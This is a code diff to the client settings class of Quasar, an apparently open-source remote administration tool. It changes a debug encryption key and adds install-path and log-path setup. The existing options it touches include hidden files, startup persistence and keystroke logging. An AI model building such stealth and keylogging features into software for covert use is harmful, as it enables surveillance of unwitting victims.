@@ -1,6 +1,6 @@
 ﻿using Quasar.Common.Cryptography;
-using Quasar.Common.Helpers;
 using System;
+using System.IO;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
@@ -8,6 +8,9 @@ using System.Windows.Forms;
 
 namespace Quasar.Client.Config
 {
+    /// <summary>
+    /// Stores the configuration of the client.
+    /// </summary>
     public static class Settings
     {
 #if DEBUG
@@ -24,7 +27,7 @@ namespace Quasar.Client.Config
         public static string STARTUPKEY = "Test key";
         public static bool HIDEFILE = false;
         public static bool ENABLELOGGER = false;
-        public static string ENCRYPTIONKEY = "-.)4>[=u%5G3hY3&";
+        public static string ENCRYPTIONKEY = "CFCD0759E20F29C399C9D4210BE614E4E020BEE8";
         public static string TAG = "DEBUG";
         public static string LOGDIRECTORYNAME = "Logs";
         public static string SERVERSIGNATURE = "";
@@ -32,10 +35,13 @@ namespace Quasar.Client.Config
         public static X509Certificate2 SERVERCERTIFICATE;
         public static bool HIDELOGDIRECTORY = false;
         public static bool HIDEINSTALLSUBDIRECTORY = false;
+        public static string INSTALLPATH = "";
+        public static string LOGSPATH = "";
+        public static bool UNATTENDEDMODE = true;
 
         public static bool Initialize()
         {
-            FixDirectory();
+            SetupPaths();
             return true;
         }
 #else
@@ -60,6 +66,9 @@ namespace Quasar.Client.Config
         public static X509Certificate2 SERVERCERTIFICATE;
         public static bool HIDELOGDIRECTORY = false;
         public static bool HIDEINSTALLSUBDIRECTORY = false;
+        public static string INSTALLPATH = "";
+        public static string LOGSPATH = "";
+        public static bool UNATTENDEDMODE = false;
 
         public static bool Initialize()
         {
@@ -75,27 +84,15 @@ namespace Quasar.Client.Config
             LOGDIRECTORYNAME = aes.Decrypt(LOGDIRECTORYNAME);
             SERVERSIGNATURE = aes.Decrypt(SERVERSIGNATURE);
             SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(aes.Decrypt(SERVERCERTIFICATESTR)));
-            FixDirectory();
+            SetupPaths();
             return VerifyHash();
         }
 #endif
 
-        static void FixDirectory()
+        static void SetupPaths()
         {
-            if (PlatformHelper.Is64Bit) return;
-
-            // https://msdn.microsoft.com/en-us/library/system.environment.specialfolder(v=vs.110).aspx
-            switch (SPECIALFOLDER)
-            {
-                case Environment.SpecialFolder.ProgramFilesX86:
-                    SPECIALFOLDER = Environment.SpecialFolder.ProgramFiles;
-                    break;
-                case Environment.SpecialFolder.SystemX86:
-                    SPECIALFOLDER = Environment.SpecialFolder.System;
-                    break;
-            }
-
-            DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
+            LOGSPATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), LOGDIRECTORYNAME);
+            INSTALLPATH = Path.Combine(DIRECTORY, (!string.IsNullOrEmpty(SUBDIRECTORY) ? SUBDIRECTORY + @"\" : "") + INSTALLNAME);
         }
 
         static bool VerifyHash()
